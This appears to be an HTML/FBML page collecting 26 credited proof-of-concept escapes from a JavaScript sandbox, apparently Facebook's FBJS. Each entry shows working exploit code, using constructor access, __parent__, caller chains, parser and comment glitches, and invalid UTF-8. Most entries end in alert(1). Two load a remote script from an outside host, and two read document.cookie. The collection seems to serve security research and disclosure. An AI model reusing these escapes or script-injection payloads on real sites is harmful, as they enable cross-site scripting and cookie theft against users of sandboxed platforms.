<style type="text/css">
.exploits small {
  display: block;
}
.exploits h3 {
  margin: 10px 0px 0px 0px;
}
.exploits p {
  margin: 0px;
}
</style>

<div id="exploits" class="exploits">
<h3>Hole #1: setTimeout w\ string</h3>
<p>
<small>Author: Neil Mix</small>
<a href="#" onclick="setTimeout('alert(1)', 0); return false;">Exploit #1</a>
</p>

<h3>Hole #2: Function.constructor</h3>
<p>
<small>Author: Neil Mix</small>
<a href="#" onclick="exploit2(); return false;">Exploit #2</a>
<script><!--
function exploit2() {
  try {
    var F = (function(){}).constructor;
    var getWindow = new F('return this;');
    getWindow().alert(1);
  } catch(e) {};
}
//--></script>
</p>

<h3>Hole #3: Clever Objects</h3>
<p>
<small>Author: Neil Mix</small>
<a href="#" onclick="exploit3(); return false;">Exploit #3</a>
<script><!--
function exploit3() {
  var obj = {};
  obj.toLowerCase = function() { return 'b' };
  obj.toString = function() { return 'script' };
  var script = document.createElement(obj);
  script.setSrc('http://llamaguy.com/fbjs/exploit.js');
  document.getElementById('exploits').appendChild(script);
}
//--></script>
</p>

<h3>Hole #4: Element.constructor</h3>
<p>
<small>Author: Neil Mix</small>
<a href="#" onclick="exploit4(); return false;">Exploit #4</a>
<script><!--
function exploit4() {
  try {
    var obj = document.getElementById('exploits');
    obj = obj.constructor.get_obj(obj);
    obj.ownerDocument.defaultView.alert(1);
  } catch(e) {};
}
//--></script>
</p>

<h3>Hole #5: Clever Objects Part 2</h3>
<p>
<small>Author: Neil Mix</small>
<a href="#" onclick="exploit5(); return false;">Exploit #5</a>
<script><!--
function exploit5() {
  try {
    var obj = {
      c: 0,
      toString: function() {
        return this.c++ ? 'script' : 'b'
      }
    };
    var script = document.createElement(obj);
    script.setSrc('http://llamaguy.com/fbjs/exploits.js');
    document.getElementById('exploits').appendChild(script);
  } catch(e) {};
}
//--></script>
</p>

<h3>Hole #6: String.constructor</h3>
<p>
<small>Author: Marcel Laverdet</small>
<a href="#" onclick="exploit6(); return false;">Exploit #6</a>
<div id="exploit6"></div>
<script><!--
function exploit6() {
  try {
    ''.constructor.replace = function() {
      return this.toString();
    }
    document.getElementById('exploit6').setTextValue('<a href="#" onclick="alert(1)">click this...</a>');
  } catch(e) {};
}
//--></script>
</p>

<h3>Hole #7: Parser Glitch</h3>
<p>
<small>Author: Marcel Laverdet</small>
<a href="#" onclick="}], {})&&arguments[0].target.ownerDocument.defaultView.alert(1); return false;//">Exploit #7</a>
</p>

<h3>Hole #8: [].__parent__</h3>
<p>
<small>Author: Jeff Walden</small>
<a href="#" onclick="try{[].__parent__.alert(1);}catch(e){}; return false;">Exploit #8</a>
</p>

<h3>Hole #9: Destructuring Assignments</h3>
<p>
<small>Author: Jeff Walden</small>
<a href="#" onclick="try{exploit9();}catch(e){}; return false;">Exploit #9</a>
<script><!--
function exploit9() {
  try {
//    var {'__parent__': w} = 0;
    w.alert(1);
  } catch(e) {};

  try {
//    var {"__parent__": w} = 0;
    w.alert(1);
  } catch(e) {};

  try {
//    var {__parent__: w} = 0;
    w.alert(1);
  } catch(e) {};
}
//--></script>
</p>

<h3>Hole #10: arguments.callee.caller</h3>
<p>
<small>Author: Jeff Walden</small>
<a href="#" onclick="try{exploit10();}catch(e){}; return false;" onmouseout="exploit10_2(event)">Exploit #10</a> (will alert on mouse out)
<script><!--
var fbjs_event;
function exploit10() {
  var evt = {};
  evt.__defineGetter__('target', function() {
    throw fbjs_event = arguments.callee.caller;
  });

  try {
    var dispatcher = arguments.callee.caller.caller;
    dispatcher.call([], evt);
  } catch (e) {}

  fbjs_event.allowed_properties.currentTarget = true;
}
function exploit10_2(evt) {
  var domTarget = evt.currentTarget;
  var document = domTarget.ownerDocument;
  var script = document.createElement('script');
  script.textContent = "window.alert(1);";
  domTarget.appendChild(script);
}
//--></script>
</p>

<h3>Hole #11: ({}).eval</h3>
<p>
<small>Author: Jeff Walden</small>
<a href="#" onclick="try{({}).eval('alert(1)');}catch(e){}; return false;">Exploit #11</a>
</p>

<h3>Hole #12: Object.constructor \ Array.constructor</h3>
<p>
<small>Author: Jeff Walden</small>
<a href="#" onclick="exploit12(); return false;">Exploit #12</a>
<script><!--
function exploit12() {
  try {
    var w;
    var p = {}.constructor.prototype;
    p.__defineSetter__("1", function(v) {
      w = v;
      w.alert(1);
      return v;
    });
    exploit12.bind.apply(null, [{}]);
  } catch(e) {};

  try {
    var w;
    var p = [].constructor.prototype;
    p.__defineSetter__("1", function(v) {
      w = v;
      w.alert(1);
      return v;
    });
    exploit12.bind.apply(null, [{}]);
  } catch(e) {};
}
//--></script>
</p>

<h3>Hole #13: Clever .__instance</h3>
<p>
<small>Author: Eli Friedman</small>
<a href="#" onclick="try{exploit13(this);}catch(e){}; return false;">Exploit #13</a>
<script><!--
function exploit13(obj) {
  var i = 1;
  function exploit13_2(){
    if (i--) {
      obj = exploit13_2.caller(obj);
    }
    return 0;
  };
  obj.__instance = {toString: exploit13_2};
  obj.setTextValue('');
  obj.ownerDocument.defaultView.alert(1);
}
//--></script>
</p>

<h3>Hole #14: delete Element.constructor</h3>
<p>
<small>Author: Eli Friedman</small>
<a href="#" onclick="exploit14(); return false;">Exploit #14</a>
<script><!--
function exploit14() {
  try {
    var obj = document.getElementById('exploits');
    delete obj.constructor;
    obj = obj.constructor.get_obj(obj);
    obj.ownerDocument.defaultView.alert(1);
  } catch(e) {};
}
//--></script>
</p>

<h3>Hole #15: Familiar .__instance</h3>
<p>
<small>Author: Eli Friedman</small>
<a href="#" onclick="exploit15(this); return false;">Exploit #15</a>
<script><!--
function exploit15(obj) {
  try {
    var child = document.createElement('div');
    obj.__instance = 'call';
    exploit15.call.instance = obj;
    exploit15.call.obj = {appendChild: function(r){r.ownerDocument.defaultView.alert(1);}};
    obj.appendChild(child);
  } catch(e) {};
}
//--></script>
</p>

<h3>Hole #16: Parser Glitch Part Two</h3>
<p>
<small>Author: Eli Friedman</small>
<a href="#" onclick="try{exploit1['')+('__parent__'].alert(1);}catch(e){}; return false;">Exploit #16</a>
</p>

<h3>Hole #17: Clever Contexts</h3>
<p>
<small>Author: Eli Friedman</small>
<a href="#" onclick="try{exploit17()}catch(e){}; return false;">Exploit #17</a>
</p>
<script><!--
function exploit17() {
  try {
    [].sort.call(null).alert('Array.prototype.sort');
  } catch(e){};
  try {
    ({}).valueOf.call(null).alert('Object.prototype.valueOf');
  } catch(e){};
  try {
    [].forEach.call(null, function(r,s,t){t.alert('Array.prototype.forEach');});
  } catch(e){};
  try {
    [].slice.call(null)[0].parent.alert('Array.prototype.slice');
  } catch(e){};
}
//--></script>
<fb:iframe style="position: absolute; top:-1000px; left:-1000px" src="http://google.com/"></fb:iframe>

<h3>Hole #18: Conditional Comments</h3>
<p>
<small>Author: David Bloom</small>
<a href="#" onclick="try{exploit18()}catch(e){}; return false;">Exploit #18</a>
</p>
<script><!--
function exploit18() {
/*@cc_on
alert(document.cookie);
@*/
}
//--></script>

<h3>Hole #19: Nested Comments</h3>
<p>
<small>Author: David Bloom</small>
<a href="#" onclick="try{exploit19()}catch(e){}; return false;">Exploit #19</a>
</p>
<?php ob_start() ?>
<script><!--
function exploit19() {
<!-/**/-foo.
alert(1);
}
//--></script>
<?php ob_end_clean() ?>

<h3>Hole #20: Newline Slash</h3>
<p>
<small>Author: Nick Cleaton</small>
<a href="#" onclick="try{exploit20()}catch(e){}; return false;">Exploit #20</a>
</p>
<script><!--
function exploit20() {
var munge = "moo moo   \//foo
var moo = " ; alert(document.cookie); var bar = "; mungo \//bar
jerry"
}
//--></script>

<h3>Hole #21: Invalid UTF-8</h3>
<p>
<small>Author: Alexander Sotirov</small>
<a href="#" onclick="try{exploit21()}catch(e){}; return false;">Exploit #21</a>
</p>
<script><!--
function exploit21() {
  foo="<?="\xC0"?>"; bar="; alert(1);//";
}
//--></script>  

<h3>Hole #22: Crazy __parent__</h3>
<p>
<small>Author: Jouko PynnÃ¶nn</small>
<a href="#" onclick="try{1.['__parent__'].eval('alert(1)')}catch(e){}; return false;">Exploit #22a</a>, 
<a href="#" onclick='try{"a"["__parent__"].eval("alert(2)")}catch(e){}; return false;'>Exploit #22b</a>, 
<a href="#" onclick="try{'a'['__parent__'].eval('alert(3)')}catch(e){}; return false;">Exploit #22c</a>, 
<a href="#" onclick="try{/a/['__parent__'].eval('alert(4)')}catch(e){}; return false;">Exploit #22d</a>
</p>

<h3>Hole #23: E4X</h3>
<p>
<small>Author: Jouko PynnÃ¶nn</small>
<a href="#" onclick="try{exploit23()}catch(e){}; return false;">Exploit #23</a>
</p>
<script><!--
/*
function exploit23() {
<a a="
a" {alert(1)}="a"
/>
}
*/
//--></script>  

<h3>Hole #24: The apply hack</h3>
<p>
<small>Author: Anonymous</small>
<a href="#" onclick="try{exploit24()}catch(e){}; return false;">Exploit #24</a>
</p>
<script><!--
function exploit24() {
  var foo = {
    apply: function(that) {
      that.eval("alert(1)")
    },
    bar: unescape.bind
  };
  foo.bar(false)();
}
//--></script>  

<h3>Hole #25: Dammit Wei...</h3>
<p>
<small>Author: Marcel</small>
<a href="#" onclick="try{exploit25()}catch(e){}; return false;">Exploit #25</a>
</p>
<script><!--
function exploit25() {
  [].clone.call(null)[0].alert(1);
}
//--></script>  

<h3>Hole #26: Scope insanity (what the hell?)</h3>
<p>
<small>Author: John C Mitchell</small>
<a href="#" onclick="try{exploit26()}catch(e){}; return false;">Exploit #26</a>
</p>
<script><!--
var exploit26 = function foo(x) {
  if (!x) {
    foo(1);
  } else {
    this.ref = function(a){return a};
    return void function(){return this}.call(null).alert(1);
  }
}
//--></script>  

</div>
